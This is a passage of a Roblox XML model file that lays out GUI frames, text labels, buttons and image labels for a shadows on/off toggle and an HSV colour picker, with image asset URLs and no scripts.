														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBXE81A7525697F4AFF8CFEA58F639EB211">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX17456C72434948499442BF8DC697AC03">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">16</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
									</Item>
									<Item class="Frame" referent="RBX954BA80034EB4038A656C4EBCDB01753">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">ShadowsOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>80</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBXE120EBBE60A34EF5B7D2B36F7AEF2166">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>50</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Shadows</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBXC41BA5CA41E94BC1B3A6DFD6C99DA0C6">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">On</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>55</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>45</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="Frame" referent="RBX4AFC06FDF177494F882E5638D315AA45">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>4</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-4</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextButton" referent="RBX99C8C3FF77684B5FB6C81D36C94E1746">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">true</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">Button</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">1</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX4E09B76022D148A59A9A366E51DB6454">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX0D14128473BD41DFA9D7A716908E7950">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<string name="Name">Label</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">ON</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBXD501F4D57F9C473381BCFC1B40F0D9C4">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Off</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>100</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>45</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="Frame" referent="RBX98A4E2B5C1B54776A4FA373625D018EC">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>4</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-4</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextButton" referent="RBXA51C6403CA544856BCA76E7658D7BA4E">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">true</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">Button</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">1</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX4E54CC63888F480BBAA8BA4504F461A6">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX346D0DEA31CB420C939A7D96AFBF2492">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<string name="Name">Label</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">OFF</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
									</Item>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBXD1BEF3AED68E41C4912F61FB5B769F54">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4278190080</Color3>
								<float name="BackgroundTransparency">0.899999976</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTHSVColorPicker</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>220</XO>
									<YS>0</YS>
									<YO>116</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>250</XO>
									<YS>0</YS>
									<YO>380</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="ImageButton" referent="RBX986965E001A8493DB5616D68B30A4482">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<bool name="AutoButtonColor">true</bool>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">0</float>
									<Color3 name="BorderColor3">4281677109</Color3>
									<int name="BorderSizePixel">1</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<Content name="Image"><url>http://www.mulrbx.com/asset?id=141066192</url></Content>
									<Color3 name="ImageColor3">4294967295</Color3>
									<Vector2 name="ImageRectOffset">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Vector2 name="ImageRectSize">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<float name="ImageTransparency">0</float>
									<bool name="Modal">false</bool>
									<string name="Name">HueSaturation</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>10</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<token name="ScaleType">0</token>
									<bool name="Selectable">true</bool>
									<bool name="Selected">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>209</XO>
										<YS>0</YS>
										<YO>200</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<Rect2D name="SliceCenter">
										<min>
											<X>0</X>
											<Y>0</Y>
										</min>
										<max>
											<X>0</X>
											<Y>0</Y>
										</max>
									</Rect2D>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="ImageLabel" referent="RBX4434D69817AE46818457781EFD7A706B">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141186650</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<string name="Name">Cursor</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>-8</XO>
											<YS>0</YS>
											<YO>194</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>16</XO>
											<YS>0</YS>
											<YO>16</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="ImageButton" referent="RBX1BFAB1D341D447E39123463754C0B83A">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<bool name="AutoButtonColor">true</bool>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4281677109</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141066196</url></Content>
									<Color3 name="ImageColor3">4294967295</Color3>
									<Vector2 name="ImageRectOffset">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Vector2 name="ImageRectSize">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<float name="ImageTransparency">0</float>
									<bool name="Modal">false</bool>
									<string name="Name">Value</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>229</XO>
										<YS>0</YS>
										<YO>10</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<token name="ScaleType">0</token>
									<bool name="Selectable">true</bool>
									<bool name="Selected">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>13</XO>
										<YS>0</YS>
										<YO>200</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<Rect2D name="SliceCenter">
										<min>
											<X>0</X>
											<Y>0</Y>
										</min>
										<max>
											<X>0</X>
											<Y>0</Y>
										</max>
									</Rect2D>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">2</int>
								</Properties>
								<Item class="Frame" referent="RBX1CC75E073B204B1ABC236E2C0ECF4540">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBG</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
